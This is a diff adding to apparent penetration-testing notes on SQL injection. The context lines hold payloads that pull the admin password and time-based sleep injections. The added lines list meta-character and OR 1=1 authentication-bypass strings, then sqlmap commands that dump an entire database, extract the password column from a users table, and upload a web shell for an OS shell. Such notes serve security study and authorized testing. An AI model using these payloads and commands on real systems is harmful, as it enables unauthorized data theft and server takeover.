@@ -22,3 +22,37 @@ CONVERT((SELECT password FROM users WHERE username="admin"), DATE);--
 ' or sleep(15) and 1=1#
 ' or sleep(15)#
 ' union select sleep(15),null#
+
+Meta Characters
+'
+''
+;%00
+--
+-- -
+""
+;
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+OR 1=1
+
+
+SQLMap 
+1 Saved burp req
+2 sqlmap -r 
+-r = path to saved req
+-p = parameter to test for 
+
+sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –dump-all
+
+If you’re not interested in dumping the entire database, you could use
+the --dump command to specify the exact table and columns you would like:
+$ sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –dump -T users -C password -D helpdesk
+
+Sometimes SQL injection vulnerabilities will allow you to upload a web
+shell to the server that can then be executed to obtain system access. You
+could use one of SQLmap’s commands to automatically attempt to upload a
+web shell and execute the shell to grant you with system access:
+$ sqlmap -r /home/hapihacker/burprequest1 -p vuln-param –os-shell
